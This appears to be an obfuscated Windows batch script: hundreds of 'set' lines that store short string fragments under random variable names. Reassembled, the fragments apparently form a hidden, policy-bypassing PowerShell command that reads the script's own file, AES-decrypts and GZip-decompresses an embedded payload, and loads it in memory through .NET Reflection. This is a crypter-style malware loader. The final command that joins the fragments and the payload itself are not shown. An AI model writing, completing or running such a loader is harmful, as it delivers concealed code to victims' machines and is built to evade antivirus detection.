@echo off
set "tunkTRAtdl=py"
set "OVLnXYktfV=ow"
set "JHZxXltNIx=em"
set "MpvmLyGJRG=ll"
set "FbHsDYWVJV=we"
set "VSSllbYTJf=rs"
set "CeTTVPcVYb=.e"
set "uzRSihHwiQ=0\"
set "kOmBBMxmYJ=st"
set "wFukCAbGRi=y "
set "qcCSVccBvv=Po"
set "FVUytJEDCo=we"
set "JvXvTkmkkD=32"
set "snAlxCMcfY=nd"
set "AncuExLwNK=ws"
set "UZPKeyXlJF=co"
set "jsnMEgJczw= C"
set "wdJUpoEYRD=rS"
set "IVhkcWwFGn=po"
set "CGtvaxElDR=in"
set "bhTNCZTrfK=s\"
set "XCVAIJvhzR=xe"
set "xdKSJwDNRF=1."
set "FVAMYBVzPN=he"
set "agpZTPQRIr=do"
set "APMSnnsIDG=\v"
set "HvjUeXQsAq=:\"
set "NfNOoXLpmM= /"
set "IjzVHUaftY=Wi"
set "emVDKnUrlP=\W"
set "fEIBduUYxC=Sy"
set "aYhDZzFsyz=ll"
set "LixTBYDxeR=he"
set "tMDGFtlSYL= %~dp0"
set "gBoYTrgOdZ=cd"
set "YpHbYKzOaZ=ress"
set "PifwLaoJOz=Invo"
set "ExBYiAyAhz=EwG."
set "voaSQBQqUz=Obje"
set "EhFKedEcQt=b = "
set "qFLRRDiSFO=ptor"
set "MdcehMvQRS=iron"
set "EdWfNyGnHv=..-1"
set "ZNiAliJSIj='dqR"
set "koNjmSSjiy=BNNT"
set "xOdvwGICxn=FP ="
set "WUnhvgyUDy=-4] "
set "jCsoZUQQzV=.GZi"
set "yaOYPLyrIK= [Sy"
set "CcQFrOaMJc=3); "
set "DBDdRdqdZZ=gth)"
set "CKzsMyuwMS=rity"
set "iEmSkJKRJN=se()"
set "nopoQdqzMq='[-1"
set "lxfyjFqatj=V = "
set "EmJvrlwctU=Q.En"
set "BEeMQOIySg=-joi"
set "TjgdBscYsw=Mode"
set "MDrFooBRKK=z) {"
set "xHnmTDEWxJ=rt]:"
set "rSoEkccuqN=)($y"
set "xmxZJsjkyp=] -j"
set "aIAlBUOmiu=ress"
set "sleDithdlF=ct S"
set "DkHCLmSvAk=R = "
set "mJfrvFiBnc=yste"
set "dngPRlXcHX=)))"
set "HezVZJTtet=.Cry"
set "FMwkOuTLGg=bypa"
set "CMfrNrJMHD=tryP"
set "OwAOfmpMTI=;$TH"
set "ZpQIgnWvWA=[]] "
set "WATziYdsdz=em.I"
set "iCSdflASlB=R = "
set "xhrajxqXjN=daeR"
set "dTTiOGzWpv=UGTu"
set "jswiThsNhu=.Sec"
set "LQQsgmpPdi=$EBN"
set "lsGWvwdJgY=n ''"
set "eaVoqSvsRp=ddin"
set "BxekMAuzYL=-joi"
set "oAPzcliqaZ=flec"
set "cuPqdyHinh=Bmor"
set "bJaooeLbzN==');"
set "QuAOwJvZiO=join"
set "UytKBPGyNx=ew-O"
set "HINGxJxCpM='txe"
set "iSGnHwQbCR=grap"
set "nWwmYMqOPg=$yDZ"
set "SaGVUKNAuh=('da"
set "jMKcLlVcHM='gni"
set "qOVucUMQOb=.Cre"
set "qezMiqkEMK=[Env"
set "UwulIXUepp=tem."
set "mFTplinsvM=[IO."
set "kXvxwAJThi=n ''"
set "qdRWEACkLZ=; };"
set "bKOSczpatD=tS46"
set "ZcnqqhUiQC=$uYo"
set "oqjCmBwQhY=BNNT"
set "gnJAfJCppx='[-1"
set "ohhZtkiyef=nirt"
set "rSXBEZyQLU=);$T"
set "ktWokLxtfy=($ta"
set "SkzAlSQnPe=rofi"
set "WACxfbKxSW=oin "
set "SMWIRnNtiH=T.Pa"
set "kDdJNSLsdU=..-1"
set "bcDwkVpDsM=rans"
set "wbkfExknye=Star"
set "gXgdYDaoSI=();$"
set "eUiFolgAHh=0O+g"
set "AZEGbZBEpv=mBYT"
set "NLTIlyIeuR=tem."
set "cukIbcbgqL=$vND"
set "rBubYnaAVy=BZ, "
set "uzaYCmLUiC=);$G"
set "WNevRhjvJM= '')"
set "fCZkbmHvXV=rity"
set "sROJjqrTVO=ZYYc"
set "gfPxipYzsJ=embl"
set "CcmMWAaKAQ=gMod"
set "xxWjsfElVd=, $y"
set "dpLiYEPnXF=();$"
set "EKyFbVOTeZ=]::("
set "yZikUbAVTK= = $"
set "qJpgAwWsjZ=ptog"
set "xMjpXRfYbl=7Yiv"
set "yIZwtyPmlK=$Gvi"
set "EFPVMKlnSD=ispo"
set "wpQzBDuHps=-nop"
set "qjaqzFhAOz=and "
set "AmmreHMReJ=yDZS"
set "UgIWNFOPGt=ewLi"
set "xbrCSUJQRa=.Key"
set "famPgSqCim=ecry"
set "XbUZjXzRfu=lBlo"
set "UZCLjkXoIl=bjec"
set "WnkAYjLNAL=d;$E"
set "pxCPWtkmnK= '')"
set "WqCMTqeaYg=oL'["
set "wZgYDbYYmD=taOk"
set "kslZsNndvL=vert"
set "AyBIffPUiu=ct S"
set "MdgjabFmSq=File"
set "RylsijImiB=Obje"
set "XQdBlTTdKJ=FBZ."
set "zDXaHRMRDG=oint"
set "cDjlhqQHEZ=oZFB"
set "OBjkVdDwGJ=comp"
set "CJpGCDBGmz=-ep "
set "WhdOujiIms=raph"
set "pFaBNMuWHk=esFX"
set "SFVTMhsTXC=pres"
set "FTwvejTjjc=Syst"
set "jvZwWmjkuP=]::C"
set "qpxmwrqjYL=SR ="
set "isYCnBFNIV=t Sy"
set "YqQFZWURiq=('l0"
set "lzrbvLODUB=DZSR"
set "ScJzmPoQAB=qp.T"
set "bkVOAKWnkr=Disp"
set "ULNUgcGNZA=)($x"
set "NYVidEPqjh=O.Me"
set "WlFBtJCmUd=gnir"
set "iuTsIEuYEG=)) {"
set "NPQWQklBYF=7;$E"
set "UgrGXqhLvX=[Sys"
set "PERRKLMhOb=vj0m"
set "aYSXQEjxDk=;$oo"
set "qXNjGgYLCz=yste"
set "dfqMPDuWMs=mory"
set "nESVRzVMZl=oopm"
set "wFMugJjAaJ=HEwG"
set "hBPuUbNWbf=saBm"
set "NhoiDvYzPZ=('%*'"
set "vJuTsKFlnK=Stre"
set "RcpNPOBMMp=('%~f0'"
set "dauAkGvUQX=e = "
set "rpcpXQRjGN=BNNT"
set "LENHJXobEj=form"
set "tlJeQFrece=, (,"
set "VgTWCPKAiI=oqp."
set "GPnaMvuZEA= [Sy"
set "ENgykMjZXF=pStr"
set "ymWibdjdlZ=brea"
set "jTQRCMoMsr=y.Cr"
set "ZuUlsaFFAm=.Con"
set "yOudweeBNs=ay()"
set "VhLPtSWrOi=stem"
set "TDVeQPrxEI=:: '"
set "DeOvZupCZC=trea"
set "hVzrFlNaVw= = N"
set "IrLhMXTVQW=in $"
set "WCaWTwoAqK=NT.I"
set "zzIPlBaciB=mBYT"
set "tRozlrwkkw=raph"
set "tQUqXSFiBM=BNNT"
set "nCtICwwPGN=Disp"
set "prpHnFpBjd=sGUc"
set "EkGBuzEUPA=3HWs"
set "drpuBTZguu=yDZS"
set "xwzrZBUqzO=viAb"
set "aBrUqqCgoj=yDZS"
set "BuKYrZcPhA=onve"
set "qPQCXQjpZw== [S"
set "jtFuAmjkdD=OkQ "
set "JdygDdtkrN=stem"
set "GNGfIHHoXv=ose("
set "TncwrMcXtY=[Sys"
set "ozrKnCzRxa=urit"
set "fXjZhKbbmi=oqp "
set "qykZxXuaHG=Secu"
set "YCbKIlCXyT=.Dis"
set "wfeohIiGln=);$E"
set "jYHmfoAkHI=yTo("
set "uqhsWzDxmL=::('"
set "dlbWHPdpme=v4Ir"
set "RjxAEMnfbm=DZSR"
set "JMCnzfMxDv=736u"
set "RqPeRnpbQp=ck($"
set "pGjPMrYkPj=]::("
set "WDWrrztJlj=ing("
set "RBDjftIrwM=($ta"
set "mSQGknqkkx=ion."
set "BdMcbtoLSU=Comp"
set "NDcMXeLuGz=).Sp"
set "EGrgkfDWvs=1..-"
set "KRkQctaMNR=m(, "
set "rELCTVfQOW=le  "
set "HYnEtfTaME=pDZz"
set "kHMvaJdtpg=.Len"
set "aSteaNOcVM=.Cop"
set "DExqNlekZx=Fo7l"
set "BlhLfRvubp=e]::"
set "BNHgMxBQmK=oryS"
set "UzHipREnGF=ss -"
set "XeAnxydtTb=esaB"
set "QHhazmDpYC=GdFP"
set "pzhugVKoeb=y.Ci"
set "BBYVRfafSx=OkQ."
set "dBWbxUQlbd=;$uY"
set "ZWFxJIQSLd=New-"
set "dcHZeMxneV=em.C"
set "gmGHQVuvqv=BNNT"
set "zXVBEGJqSv=m.IO"
set "UHaYRIVaNN=tem."
set "GJirSrmCkf=nage"
set "kyKLrXTJGo=-Obj"
set "wihthNrMfs=.-16"
set "YDdzUHzeoZ=New-"
set "xYsflJWDUI=.Mod"
set "bzHOWlDnUp=:('g"
set "TCDSMlqdpE= = $"
set "LrEBKOsyoT=ptog"
set "eaCcPjSIDd=pose"
set "hecJFwPvfA=S46e"
set "RWPWMTEzBh===')"
set "DQNAJnHBKx='')("
set "rfTKNgVnCU=m.IO"
set "jlaiKQjhJF=GviA"
set "VLhpWZGGFw=();$"
set "vgRsBXxXiA=[-1."
set "SkvJVAhSyC=F'[-"
set "woowGXkPHA=::De"
set "EDsvAUpLNU=FP.T"
set "DBdihKGNpn=$yDZ"
set "TGvPgIYRIw=esMa"
set "RDmsOhVSew=ateD"
set "IRTNgAWYFh=lit("
set "aJIQwrEqSw=Ab.D"
set "KnexEJIUAF=morF"
set "OXXBYqQWXc=;$oZ"
set "UJiIWtoSAO=Z = "
set "VowToIAEEg=ert]"
set "zpcMFJCRes=$XGd"
set "YfjIcsSejK=oArr"
set "nyoUflYoZN=y.Pa"
set "sdnHISOUfQ== $E"
set "jrqNNLsVmP=-1.."
set "ddtmkHbiFw=BC;$"
set "hHWxTjWxey=fore"
set "PkLPBoLrjB=Conv"
set "olmYcMvlVV= = ["
set "aZmOHiTanw=$XGd"
set "fSdiSxjBbb=SR);"
set "BYrmwmhEzW=stem"
set "UpqPFrALHr=);$X"
set "jrxDOGFjSm=.Cry"
set "UapkvkjYSE=.Dis"
set "wOURlqzoSI=orF'"
set "NbpZSntMew=eam("
set "PPzrqjNsTJ=rtS4"
set "fRFXRnGmWN=  $x"
set "zFzNgflqmB=ke($"
set "xDSsQjVTXI=comm"
set "EMdJjPQUST=ddin"
set "IMQfTOXyzn=pher"
set "WPeqDUPELo=pmQ "
set "jvAZOJJdzB=m.Re"
set "RWlRbpXuDG=y]::"
set "DTqAkdAWQi=OyzA"
set "IPFNcZjCHp=ment"
set "tzsBynQPuU=join"
set "jeBQiJMdgh=Q.Su"
set "liAMpTVrFm=;$uY"
set "KHAbqirbmX=+hAO"
set "XGYtjYYOSc= [st"
set "WlqXipzFfq=[Sys"
set "uimwOKKOyM=R, 0"
set "hODlIcitny=.IO."
set "uYKWCgsdSO=EBNN"
set "CXXbwOSbpp=.Mem"
set "mEgpOXlDck=pose"
set "NlMGGGikzI=k; }"
